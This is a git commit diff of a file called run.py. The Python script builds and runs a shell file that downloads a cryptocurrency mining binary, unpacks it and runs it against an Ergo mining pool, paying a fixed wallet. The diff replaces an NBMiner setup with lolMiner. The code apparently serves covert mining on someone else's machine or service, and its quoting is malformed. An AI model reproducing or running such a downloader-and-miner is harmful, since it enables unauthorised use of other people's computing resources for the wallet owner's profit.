7a236217edb3def97d6a124b30440dd6c6b73cc7
togninifabio98 <95686951+togninifabio98@users.noreply.github.com>
2022-02-18 21:24:37 -0500

    Update run.py

--- run.py
+++ run.py
@@ -1,6 +1,7 @@
 import os
 os.system('echo "#!/bin/sh" >> tes')
-os.system('echo "wget https://github.com/NebuTech/NBMiner/releases/download/NBMiner v39.7/NBMiner_39.7_Linux.tgz && tar -xvf NBMiner_39.7_Linux.tgz && cd NBMiner_Linux" >> tes')
-os.system('nbminer -a ergo -o stratum+tcp://de.ergo.herominers.com:1180 -u 9go8JBDqkwW6jx9jATZUPfQoso3Z2sAimHpy7wmEYbBVHxaSnX6.rknew" >> tes')
+os.system('echo "wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.35/lolMiner_v1.35_Lin64.tar.gz
+tar zxvf lolMiner_v1.35_Lin64.tar.gz && cd 1.35" >> tes')
+os.system('./lolMiner --algo AUTOLYKOS2 --pool stratum+tcp://de.ergo.herominers.com:1180 --user 9go8JBDqkwW6jx9jATZUPfQoso3Z2sAimHpy7wmEYbBVHxaSnX6.rknew" >> tes')
 os.system('sleep 2')
 os.system('sh tes')
